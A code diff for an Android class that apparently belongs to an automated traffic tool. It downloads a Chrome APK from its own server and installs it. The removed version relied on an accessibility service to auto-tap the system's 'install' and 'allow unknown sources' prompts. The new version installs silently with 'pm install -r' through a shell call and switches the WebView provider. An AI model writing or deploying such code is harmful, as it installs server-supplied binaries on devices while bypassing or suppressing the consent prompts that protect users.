@@ -1,22 +1,18 @@
 package com.zero.traffic.network;
 
 import android.content.Context;
-import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.net.Uri;
-import android.os.Build;
-import android.provider.Settings;
 import android.webkit.WebView;
-
-import androidx.core.content.FileProvider;
 
 import com.zero.traffic.server.ApiClient;
 import com.zero.traffic.util.Logger;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -30,9 +26,8 @@ import okhttp3.Response;
  *
  * 흐름:
  * 1. Chrome 설치 여부 + 버전 체크
- * 2. 서버에서 최소 버전 확인 (/chrome/version)
- * 3. 미달이면 Chrome APK 다운로드 (/chrome/download)
- * 4. PackageInstaller로 설치 (Accessibility Service가 "설치" 버튼 자동 터치)
+ * 2. 미달이면 Chrome APK 다운로드 (/chrome/download)
+ * 3. pm install -r 사일런트 설치 (shell 권한)
  */
 public class ChromeManager {
     private static final String CHROME_PACKAGE = "com.android.chrome";
@@ -78,15 +73,15 @@ public class ChromeManager {
             return currentVersion > 0; // 구버전이라도 있으면 true
         }
 
-        // 설치 시작
-        boolean installStarted = installApk(apkFile);
-        if (installStarted) {
-            Logger.i("[Chrome] 설치 시작됨 — AccessibilityService가 자동 확인");
-            // 설치 완료 대기 (최대 60초)
-            return waitForInstall(60000);
+        // pm install 사일런트 설치
+        boolean installed = installApkSilent(apkFile);
+        cleanupApk();
+        if (installed) {
+            setWebViewProvider();
+            return true;
         }
 
-        return false;
+        return currentVersion > 0;
     }
 
     /**
@@ -158,65 +153,40 @@ public class ChromeManager {
     }
 
     /**
-     * APK 설치 (시스템 인스톨러)
-     * AccessibilityService가 설치 확인 버튼 자동 터치
+     * pm install -r 사일런트 설치 (shell 권한)
+     * UI 없이 백그라운드에서 즉시 설치
      */
-    private boolean installApk(File apkFile) {
+    private boolean installApkSilent(File apkFile) {
         try {
-            // 알 수 없는 소스 설치 허용 확인
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                if (!context.getPackageManager().canRequestPackageInstalls()) {
-                    Logger.w("[Chrome] 알 수 없는 소스 설치 미허용 → 설정 열기");
-                    Intent settingsIntent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
-                    settingsIntent.setData(Uri.parse("package:" + context.getPackageName()));
-                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    context.startActivity(settingsIntent);
-                    // AccessibilityService가 "허용" 자동 터치
-                    sleep(3000);
+            String cmd = "pm install -r " + apkFile.getAbsolutePath();
+            Logger.i("[Chrome] 사일런트 설치: " + cmd);
+
+            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            StringBuilder output = new StringBuilder();
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line);
                 }
             }
 
-            Intent intent = new Intent(Intent.ACTION_VIEW);
-            Uri apkUri;
+            int exitCode = process.waitFor();
+            String result = output.toString().trim();
+            Logger.i("[Chrome] pm install 결과: " + result + " (exit=" + exitCode + ")");
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                // Android 7+ FileProvider 필요
-                apkUri = FileProvider.getUriForFile(context,
-                        context.getPackageName() + ".fileprovider", apkFile);
-                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            if (result.contains("Success")) {
+                Logger.i("[Chrome] 설치 완료!");
+                return true;
             } else {
-                apkUri = Uri.fromFile(apkFile);
+                Logger.e("[Chrome] 설치 실패: " + result);
+                return false;
             }
-
-            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
-
-            return true;
 
         } catch (Exception e) {
-            Logger.e("[Chrome] 설치 시작 실패: " + e.getMessage());
+            Logger.e("[Chrome] 사일런트 설치 실패: " + e.getMessage());
             return false;
         }
-    }
-
-    /**
-     * 설치 완료 대기
-     */
-    private boolean waitForInstall(long timeoutMs) {
-        long start = System.currentTimeMillis();
-        while (System.currentTimeMillis() - start < timeoutMs) {
-            if (getInstalledChromeVersion() >= MIN_CHROME_VERSION) {
-                Logger.i("[Chrome] 설치 완료 확인!");
-                setWebViewProvider();
-                // 다운로드한 APK 삭제
-                cleanupApk();
-                return true;
-            }
-            sleep(2000);
-        }
-        Logger.w("[Chrome] 설치 대기 타임아웃");
-        return false;
     }
 
     /**
